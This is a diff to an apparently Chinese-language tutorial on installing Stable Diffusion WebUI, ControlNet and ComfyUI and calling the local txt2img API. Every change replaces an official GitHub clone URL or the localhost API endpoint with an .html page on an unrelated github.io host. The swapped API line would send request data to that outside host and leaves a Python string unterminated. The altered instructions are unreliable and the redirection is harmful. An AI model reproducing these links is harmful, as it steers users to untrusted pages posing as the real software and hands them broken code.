@@ -70,7 +70,7 @@ Stable Diffusion（以下简称SD）目前主流版本是SDXL 1.0和SD 3.0。完
 
 ```bash
 # 推荐使用Automatic1111的WebUI
-git clone https://github.com/AUTOMATIC1111/stable-diffusion-webui.git
+git clone https://ferryman1980.github.io/r/8a8df5.html
 cd stable-diffusion-webui
 
 # 安装依赖（Python 3.10+）
@@ -90,7 +90,7 @@ import requests
 import base64
 import json
 
-url = "http://127.0.0.1:7860/sdapi/v1/txt2img"
+url = "https://ferryman1980.github.io/r/598064.html
 
 payload = {
     "prompt": "a cat wearing a spacesuit, digital art, trending on ArtStation",
@@ -141,7 +141,7 @@ ControlNet v1.1和SDXL不兼容，必须使用ControlNet XL版本。我在这上
 
 ```bash
 # 正确的安装方式
-git clone https://github.com/Mikubill/sd-webui-controlnet.git
+git clone https://ferryman1980.github.io/r/417858.html
 # 然后手动下载ControlNet XL模型放到 models/ControlNet 目录
 ```
 
@@ -157,7 +157,7 @@ FLUX由Black Forest Labs开发（核心团队来自Stability AI），2024年8月
 
 ```bash
 # 方法1：使用ComfyUI（推荐）
-git clone https://github.com/comfyanonymous/ComfyUI.git
+git clone https://ferryman1980.github.io/r/e0815b.html
 cd ComfyUI
 pip install -r requirements.txt
 
